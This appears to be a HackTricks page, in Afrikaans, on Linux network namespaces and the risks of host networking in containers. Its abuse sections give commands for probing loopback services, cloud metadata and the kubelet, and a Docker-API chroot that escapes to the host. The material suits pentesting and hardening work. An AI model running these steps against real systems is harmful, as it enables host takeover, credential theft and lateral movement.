# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die network namespace isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, routing tables, ARP/neighbor state, firewall rules, sockets, die UNIX-domain abstract socket namespace, en die inhoud van lêers soos `/proc/net`. Daarom kan 'n container iets hê wat soos sy eie `eth0`, sy eie plaaslike routes en sy eie loopback device lyk, sonder om die host se werklike network stack te besit.

Wat sekuriteit betref, is dit belangrik omdat network isolation oor veel meer as port binding gaan. 'n Private network namespace beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie namespace met die host gedeel word, kan die container skielik sigbaarheid kry van host listeners, host-local services, abstract AF_UNIX endpoints en network control points wat nooit bedoel was om aan die application blootgestel te word nie.

## Werking

'n Nuutgeskepte network namespace begin met 'n leë of byna leë network environment totdat interfaces daaraan gekoppel word. Container runtimes skep of koppel dan virtual interfaces, ken addresses toe en configureer routes sodat die workload die verwagte connectivity het. In bridge-based deployments beteken dit gewoonlik dat die container 'n veth-backed interface sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod networking.

Hierdie architecture verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide private network stack te ontvang, sluit die workload by die host se werklike een aan.

## Lab

Jy kan 'n byna leë network namespace met die volgende sien:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers met mekaar vergelyk:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die container met host-netwerk het nie meer sy eie geïsoleerde socket- en interface-aansig nie. Daardie verandering alleen is reeds betekenisvol voordat jy selfs vra watter capabilities die proses het.

## Gebruik tydens runtime

Docker en Podman skep normaalweg ’n private network namespace vir elke container, tensy dit anders gekonfigureer is. Kubernetes gee gewoonlik aan elke Pod sy eie network namespace, wat deur die containers binne daardie Pod gedeel word, maar van die host geskei is. Dit beteken dat `127.0.0.1` gewoonlik Pod-lokaal eerder as container-lokaal is: ’n listener wat slegs aan localhost gebind is in een container, is tipies vanaf sy sidecars en siblings bereikbaar. Incus/LXC-stelsels bied ook ryk network-namespace-gebaseerde isolasie, dikwels met ’n groter verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat private networking die verstek-isolasiegrens is, terwyl host networking ’n eksplisiete opt-out van daardie grens is.

## Verkeerde konfigurasies

Die belangrikste verkeerde konfigurasie is eenvoudig om die host se network namespace te deel. Dit word soms vir performance, laevlak-monitering of gerief gedoen, maar dit verwyder een van die duidelikste grense wat vir containers beskikbaar is. Host-lokale listeners word op ’n meer direkte manier bereikbaar, localhost-only-dienste kan toeganklik word, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word baie gevaarliker omdat die operasies wat hulle moontlik maak, nou op die host se eie netwerkomgewing toegepas word.

Nog ’n probleem is die oormatige toekenning van netwerkverwante capabilities, selfs wanneer die network namespace private is. ’n Private namespace help wel, maar dit maak raw sockets of gevorderde netwerkbeheer nie onskadelik nie.

In Kubernetes verander `hostNetwork: true` ook hoeveel vertroue jy in Pod-vlak-netwerksegmentering kan plaas. Kubernetes dokumenteer dat baie netwerkplugins nie verkeer van `hostNetwork` Pods behoorlik kan onderskei vir `podSelector` / `namespaceSelector`-passing nie en dit daarom as gewone node-verkeer behandel. Vanuit ’n aanvaller se oogpunt beteken dit dat ’n gekompromitteerde `hostNetwork`-werklading dikwels as ’n node-vlak-netwerktoegangspunt behandel moet word, eerder as ’n normale Pod wat steeds deur dieselfde beleidsaannames as overlay-network-werkladings beperk word.

## Misbruik

In swak geïsoleerde opstellings kan aanvallers host-listening-dienste inspekteer, management-endpoints bereik wat slegs aan loopback gebind is, verkeer sniff of beïnvloed, afhangend van die presiese capabilities en omgewing, of routing- en firewall-status herkonfigureer indien `CAP_NET_ADMIN` teenwoordig is. In ’n cluster kan dit laterale beweging en verkenning van die control plane ook makliker maak.

As jy host networking vermoed, begin deur te bevestig dat die sigbare interfaces en listeners aan die host behoort eerder as aan ’n geïsoleerde container-netwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Dienste wat slegs op loopback beskikbaar is, is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets is nog ’n maklik-om-te-misikenmerk, omdat hulle binne ’n network namespace beperk is, selfs al lyk hulle nie soos TCP/UDP listeners nie en bestaan hulle dalk nie as lêerstelselpaadjies onder `/run` nie. ’n Container met host-networking kan dus toegang erf tot beheerkanale wat slegs op die host beskikbaar is en wat glad nie in die container gemount is nie:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
’n Historiese voorbeeld was die `containerd-shim` abstract-socket exposure bug, maar die breër les is belangriker as die spesifieke CVE: sodra ’n workload by die host network namespace aansluit, word abstract AF_UNIX-services ook deel van die attack surface. As daardie sockets runtime-related of administratief voorkom, pivot na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

As network capabilities teenwoordig is, toets of die workload die sigbare stack kan inspekteer of verander:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Op moderne kernels kan host networking plus `CAP_NET_ADMIN` ook die pakketroete blootstel buiten eenvoudige `iptables` / `nftables`-veranderings. `tc` qdiscs en filters is ook namespace-scoped, dus in ’n gedeelde host network namespace is hulle van toepassing op die host-koppelvlakke wat die container kan sien. As `CAP_BPF` ook teenwoordig is, word network-verwante eBPF-programme soos TC- en XDP-loaders eweneens relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dit is belangrik omdat 'n aanvaller verkeer op die host-interfacevlak kan mirror, redirect, shape of drop, nie net firewall-reëls kan herskryf nie. In 'n private network namespace word daardie aksies tot die container se aansig beperk; in 'n shared host namespace raak dit die host.

In cluster- of cloud-omgewings regverdig host networking ook vinnige plaaslike recon van metadata en control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
In Kubernetes, onthou dat die kompromittering van **enige** container in ’n multi-container Pod ook toegang gee tot localhost-listeners wat deur sibling containers en sidecars oopgemaak is, omdat die hele Pod een network namespace deel. Dit word veral relevant met service-mesh-, observability- en helper-containers waarvan die admin- of debug-interfaces doelbewus Pod-intern eerder as clusterwyd is:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Behandel "bound to localhost" as **Pod-private**, nie **container-private**. Nadat een container in die Pod gekompromitteer is, is daardie aanname nie meer geldig nie.

### Volledige voorbeeld: Host networking + toegang tot plaaslike runtime / Kubelet

Host networking verskaf nie outomaties host root nie, maar dit stel dikwels dienste bloot wat doelbewus slegs vanaf die node self bereikbaar is. As een van daardie dienste swak beskerm word, word host networking ’n direkte privilege-escalation-pad.

Docker API op localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte host compromise indien ’n plaaslike runtime API sonder behoorlike beskerming blootgestel word
- cluster reconnaissance of lateral movement indien kubelet of plaaslike agents bereikbaar is
- traffic manipulation of denial of service wanneer dit met `CAP_NET_ADMIN` gekombineer word

## Kontroles

Die doel van hierdie kontroles is om vas te stel of die proses ’n private network stack het, watter roetes en listeners sigbaar is, en of die network view reeds soos die host lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Wat is hier interessant:

- As `/proc/self/ns/net` en `/proc/1/ns/net` reeds host-agtig lyk, deel die container moontlik die host se network namespace of ’n ander nie-private namespace.
- `lsns -t net` en `ip netns identify` is nuttig wanneer die shell reeds binne ’n named of persistente namespace is en jy dit met `/run/netns`-objekte vanaf die host-kant wil korreleer.
- `ss -lntup` is besonder waardevol omdat dit loopback-only listeners en plaaslike management endpoints onthul. `ss -xap` en `/proc/net/unix` voeg die abstract-socket-aansig by wat gewone filesystem-socket-soektogte mis.
- Roetes, interfacename, firewall-konteks, `tc`-status en eBPF-attachments word baie belangriker indien `CAP_NET_ADMIN`, `CAP_NET_RAW` of `CAP_BPF` teenwoordig is.
- In Kubernetes kan mislukte service-name resolution vanaf ’n `hostNetwork` Pod eenvoudig beteken dat die Pod nie `dnsPolicy: ClusterFirstWithHostNet` gebruik nie, nie dat die diens afwesig is nie.
- In multi-container Pods behoort localhost-listeners aan die hele Pod-network namespace. Kontroleer dus sidecars en sibling containers voordat jy aanvaar dat ’n loopback-only-poort vanaf die compromised container onbereikbaar is.

Wanneer jy ’n container nagaan, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk network capabilities is ’n heeltemal ander sekuriteitsposisie as bridge networking plus ’n beperkte default capability set.

## Verwysings

- [Kubernetes NetworkPolicy- en `hostNetwork`-slaggate](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` en abstract UNIX-socket-isolasie](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [eBPF-token- en capability-vereistes vir network-related eBPF-programme](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
